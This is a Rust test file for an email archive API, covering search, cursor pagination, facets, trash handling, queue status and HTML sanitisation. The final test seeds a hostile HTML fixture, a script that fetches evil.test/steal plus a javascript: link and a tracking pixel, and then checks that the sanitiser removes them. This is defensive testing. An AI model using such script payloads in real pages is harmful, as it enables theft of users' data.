use axum::{
    body::{Body, to_bytes},
    http::{Request, StatusCode},
};
use chrono::{TimeZone, Utc};
use serde_json::Value;
use sqlx::PgPool;
use strife_db::{
    EmailAddressInput, EmailAddressRole, EmailAttachmentInput, EmailExtractionStatus,
    EmailProjection, ROOT_NODE_ID, UpsertEmailMessage, replace_email_projection,
};
use tower::ServiceExt;
use uuid::Uuid;

async fn get(app: axum::Router, uri: &str) -> (StatusCode, Value) {
    let response = app
        .oneshot(Request::get(uri).body(Body::empty()).expect("request"))
        .await
        .expect("response");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 1 << 20)
        .await
        .expect("read body");
    let value = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
    (status, value)
}

async fn seed(pool: &PgPool, subject: &str, body: &str, from: &str, label: Option<&str>) -> Uuid {
    let node_id = Uuid::new_v4();
    sqlx::query("INSERT INTO nodes (id, parent_id, name, kind) VALUES ($1, $2, $3, 'file')")
        .bind(node_id)
        .bind(ROOT_NODE_ID)
        .bind(format!("api-{node_id}.eml"))
        .execute(pool)
        .await
        .expect("create node");
    let labels: Vec<String> = label
        .map(|value| vec![value.to_owned()])
        .unwrap_or_default();
    replace_email_projection(
        pool,
        &EmailProjection {
            message: UpsertEmailMessage {
                node_id,
                status: EmailExtractionStatus::Completed,
                parser_name: "mail-parser",
                parser_version: "0.11.5",
                message_id: Some("<api@example.test>"),
                normalized_message_id: Some("api@example.test"),
                in_reply_to: None,
                reference_ids: &[],
                subject: Some(subject),
                normalized_subject: Some(subject),
                sent_at: Some(Utc.with_ymd_and_hms(2019, 5, 1, 12, 0, 0).unwrap()),
                received_at: None,
                body_text: body,
                body_html: None,
                preview_text: body,
                content_hash: None,
                provider_thread_id: None,
                warnings: &[],
                duration_ms: None,
            },
            addresses: &[EmailAddressInput {
                role: EmailAddressRole::From,
                display_name: Some("Ada Fixture"),
                address: from,
            }],
            headers: &[strife_db::EmailHeaderInput {
                name: "Received",
                value: "by mx1.example.test",
            }],
            labels: &labels,
            attachments: &[EmailAttachmentInput {
                part_path: "2",
                filename: Some("report.pdf"),
                media_type: "application/pdf",
                disposition: Some("attachment"),
                content_id: None,
                transfer_encoding: None,
                decoded_size: Some(1024),
                checksum_sha256: None,
                is_inline: false,
                is_message: false,
                warnings: &[],
            }],
        },
    )
    .await
    .expect("seed projection");
    node_id
}

#[sqlx::test(migrations = "../db/migrations")]
async fn search_returns_email_shaped_results(pool: PgPool) {
    let node_id = seed(
        &pool,
        "Quarterly reconciliation",
        "The reconciliation figures are attached.",
        "ada@example.test",
        Some("Work"),
    )
    .await;
    let app = strife_api::email::router(pool);

    let (status, body) = get(app.clone(), "/api/email/search?q=reconciliation").await;
    assert_eq!(status, StatusCode::OK);
    let hit = &body["results"][0];
    assert_eq!(hit["node_id"], node_id.to_string());
    assert_eq!(hit["subject"], "Quarterly reconciliation");
    assert_eq!(hit["attachment_count"], 1);
    assert!(
        hit["snippet"]
            .as_str()
            .expect("snippet")
            .contains("[[reconciliation]]"),
        "matched term was not marked"
    );
    assert!(hit["sent_at"].is_string());
    // The result list renders a message, not a row: sender and labels come back
    // with the page so it needs no follow-up request per hit.
    assert_eq!(hit["from_address"], "ada@example.test");
    assert_eq!(hit["from_display_name"], "Ada Fixture");
    assert_eq!(hit["labels"][0], "Work");

    let (miss_status, miss) = get(app, "/api/email/search?q=nonexistentterm").await;
    assert_eq!(miss_status, StatusCode::OK);
    assert_eq!(
        miss["results"].as_array().expect("results").len(),
        0,
        "a miss must return an empty list, not an error"
    );
}

#[sqlx::test(migrations = "../db/migrations")]
async fn an_unconstrained_request_is_rejected(pool: PgPool) {
    let app = strife_api::email::router(pool);
    // No query and no filter would page the whole archive.
    let (status, _) = get(app.clone(), "/api/email/search").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (blank_status, _) = get(app.clone(), "/api/email/search?q=%20%20").await;
    assert_eq!(blank_status, StatusCode::BAD_REQUEST);

    // A blank query is fine when a structured filter narrows it.
    let (filtered_status, _) = get(app, "/api/email/search?label=Work").await;
    assert_eq!(filtered_status, StatusCode::OK);
}

#[sqlx::test(migrations = "../db/migrations")]
async fn invalid_parameters_are_rejected(pool: PgPool) {
    let app = strife_api::email::router(pool);
    for uri in [
        "/api/email/search?q=x&status=bogus",
        "/api/email/search?q=x&cursor=nonsense",
        "/api/email/search?q=x&after=2021-01-01T00:00:00Z&before=2020-01-01T00:00:00Z",
    ] {
        let (status, _) = get(app.clone(), uri).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{uri} was accepted");
    }
}

#[sqlx::test(migrations = "../db/migrations")]
async fn cursor_pagination_walks_the_whole_result_set(pool: PgPool) {
    for _ in 0..5 {
        seed(
            &pool,
            "Identical subject",
            "Identical body text.",
            "ada@example.test",
            None,
        )
        .await;
    }
    let app = strife_api::email::router(pool);

    let mut seen: Vec<String> = Vec::new();
    let mut uri = "/api/email/search?q=Identical&limit=2".to_owned();
    loop {
        let (status, body) = get(app.clone(), &uri).await;
        assert_eq!(status, StatusCode::OK);
        for hit in body["results"].as_array().expect("results") {
            seen.push(hit["node_id"].as_str().expect("node id").to_owned());
        }
        match body["next_cursor"].as_str() {
            Some(cursor) => {
                uri = format!("/api/email/search?q=Identical&limit=2&cursor={cursor}");
            }
            None => break,
        }
    }
    let mut deduped = seen.clone();
    deduped.sort();
    deduped.dedup();
    assert_eq!(seen.len(), 5, "paging skipped rows");
    assert_eq!(deduped.len(), 5, "paging repeated a row");
}

#[sqlx::test(migrations = "../db/migrations")]
async fn message_details_omit_raw_headers_unless_requested(pool: PgPool) {
    let node_id = seed(
        &pool,
        "Detail subject",
        "Detail body.",
        "ada@example.test",
        Some("Work"),
    )
    .await;
    let app = strife_api::email::router(pool);

    let (status, body) = get(app.clone(), &format!("/api/email/messages/{node_id}")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["subject"], "Detail subject");
    assert_eq!(body["status"], "completed");
    assert_eq!(body["labels"][0], "Work");
    assert_eq!(body["addresses"][0]["role"], "from");
    assert_eq!(body["addresses"][0]["display_name"], "Ada Fixture");
    assert_eq!(body["attachments"][0]["filename"], "report.pdf");
    assert_eq!(body["attachments"][0]["extraction_status"], "pending");
    assert!(
        body["raw_headers"].is_null(),
        "raw headers must be opt-in, not default"
    );

    let (_, with_headers) = get(
        app,
        &format!("/api/email/messages/{node_id}?include_raw_headers=true"),
    )
    .await;
    assert_eq!(with_headers["raw_headers"][0]["name"], "Received");
}

#[sqlx::test(migrations = "../db/migrations")]
async fn an_unknown_message_is_not_found(pool: PgPool) {
    let app = strife_api::email::router(pool);
    let (status, _) = get(app, &format!("/api/email/messages/{}", Uuid::new_v4())).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[sqlx::test(migrations = "../db/migrations")]
async fn facets_report_bounded_counts(pool: PgPool) {
    seed(&pool, "One", "One body.", "ada@example.test", Some("Work")).await;
    seed(&pool, "Two", "Two body.", "bob@example.test", Some("Work")).await;
    let app = strife_api::email::router(pool);

    let (status, body) = get(app, "/api/email/facets").await;
    assert_eq!(status, StatusCode::OK);
    let work = body["labels"]
        .as_array()
        .expect("labels")
        .iter()
        .find(|facet| facet["value"] == "Work")
        .expect("Work facet");
    assert_eq!(work["count"], 2);
    assert_eq!(body["correspondents"].as_array().expect("people").len(), 2);
    assert_eq!(body["years"][0]["value"], "2019");
}

#[sqlx::test(migrations = "../db/migrations")]
async fn trashed_messages_are_excluded_from_search_by_default(pool: PgPool) {
    let node_id = seed(
        &pool,
        "Discarded thread",
        "Discarded body.",
        "ada@example.test",
        None,
    )
    .await;
    strife_db::trash_node(&pool, node_id).await.expect("trash");
    let app = strife_api::email::router(pool);

    let (_, body) = get(app.clone(), "/api/email/search?q=Discarded").await;
    assert_eq!(body["results"].as_array().expect("results").len(), 0);

    let (_, included) = get(app, "/api/email/search?q=Discarded&include_trashed=true").await;
    assert_eq!(included["results"].as_array().expect("results").len(), 1);
}

#[sqlx::test(migrations = "../db/migrations")]
async fn status_separates_foreground_from_backfill_queue_depth(pool: PgPool) {
    let foreground = seed(
        &pool,
        "New arrival",
        "Freshly uploaded.",
        "ada@example.test",
        None,
    )
    .await;
    let historical = seed(
        &pool,
        "Old archive",
        "Ten years old.",
        "ada@example.test",
        None,
    )
    .await;
    strife_db::enqueue_job(&pool, strife_db::JobType::EmailExtraction, foreground, 5)
        .await
        .expect("foreground job");
    let campaign = strife_db::create_backfill_campaign(
        &pool,
        &strife_db::NewBackfillCampaign {
            kind: strife_db::BackfillKind::Email,
            candidate_definition: serde_json::json!({"version": 1}),
            batch_size: 100,
            max_queued: 500,
            max_running: 1,
            resource_class: strife_db::JobResourceClass::HeavyCpu,
            foreground_fairness: 20,
            created_by_version: "test".to_owned(),
        },
    )
    .await
    .expect("campaign");
    strife_db::enqueue_job_with_context(
        &pool,
        strife_db::JobType::EmailExtraction,
        historical,
        20,
        strife_db::JobOrigin::Backfill,
        Some(campaign.id),
        strife_db::JobResourceClass::HeavyCpu,
    )
    .await
    .expect("backfill job");

    let (status, body) = get(strife_api::email::router(pool), "/api/email/status").await;
    assert_eq!(status, StatusCode::OK);
    let counts = &body["counts"];
    // A paused campaign and a stalled inbox must not look alike, so the two
    // queues are never summed into one pending total.
    assert_eq!(counts["foreground_pending"], 1);
    assert_eq!(counts["backfill_pending"], 1);
    assert_eq!(counts["foreground_running"], 0);
    assert_eq!(counts["backfill_running"], 0);
    assert_eq!(counts["remaining"], 2);
    assert_eq!(counts["completed"], 2);
    assert_eq!(counts["indexed"], 2);
}

#[sqlx::test(migrations = "../db/migrations")]
async fn message_html_is_sanitized_before_it_leaves_the_api(pool: PgPool) {
    let node_id = Uuid::new_v4();
    sqlx::query("INSERT INTO nodes (id, parent_id, name, kind) VALUES ($1, $2, $3, 'file')")
        .bind(node_id)
        .bind(ROOT_NODE_ID)
        .bind("hostile.eml")
        .execute(&pool)
        .await
        .expect("create node");
    replace_email_projection(
        &pool,
        &EmailProjection {
            message: UpsertEmailMessage {
                node_id,
                status: EmailExtractionStatus::Completed,
                parser_name: "mail-parser",
                parser_version: "0.11.5",
                message_id: None,
                normalized_message_id: None,
                in_reply_to: None,
                reference_ids: &[],
                subject: Some("Newsletter"),
                normalized_subject: Some("Newsletter"),
                sent_at: Some(Utc.with_ymd_and_hms(2016, 3, 2, 9, 0, 0).unwrap()),
                received_at: None,
                body_text: "Newsletter body.",
                body_html: Some(
                    r#"<p>Hello</p>
                       <script>fetch('https://evil.test/steal')</script>
                       <img src="https://tracker.test/open.gif" alt="pixel">
                       <img src="cid:logo@news.test" alt="logo">
                       <a href="javascript:alert(1)">bad</a>
                       <a href="https://example.test/ok">good</a>"#,
                ),
                preview_text: "Newsletter body.",
                content_hash: None,
                provider_thread_id: None,
                warnings: &["parser note".to_owned()],
                duration_ms: None,
            },
            addresses: &[EmailAddressInput {
                role: EmailAddressRole::From,
                display_name: None,
                address: "news@example.test",
            }],
            headers: &[],
            labels: &[],
            attachments: &[EmailAttachmentInput {
                part_path: "2.1",
                filename: Some("logo.png"),
                media_type: "image/png",
                disposition: Some("inline"),
                content_id: Some("logo@news.test"),
                transfer_encoding: Some("base64"),
                decoded_size: Some(64),
                checksum_sha256: None,
                is_inline: true,
                is_message: false,
                warnings: &[],
            }],
        },
    )
    .await
    .expect("seed projection");

    let (status, body) = get(
        strife_api::email::router(pool),
        &format!("/api/email/messages/{node_id}"),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let html = body["body_html"].as_str().expect("body_html");

    // The client must never receive the original markup.
    for forbidden in [
        "<script",
        "evil.test",
        "tracker.test",
        "javascript:",
        "cid:",
    ] {
        assert!(!html.contains(forbidden), "{forbidden} survived: {html}");
    }
    // Inline reference resolved to this message's own part endpoint.
    assert!(
        html.contains(&format!("/api/email/messages/{node_id}/parts/2.1")),
        "{html}"
    );
    assert!(html.contains("https://example.test/ok"), "{html}");
    assert!(html.contains("noopener"), "{html}");
    assert_eq!(body["blocked_remote_count"], 1);
    assert_eq!(body["blocked_hosts"][0], "tracker.test");
    // Parser warnings survive alongside any the sanitizer adds.
    assert_eq!(body["warnings"][0], "parser note");
}
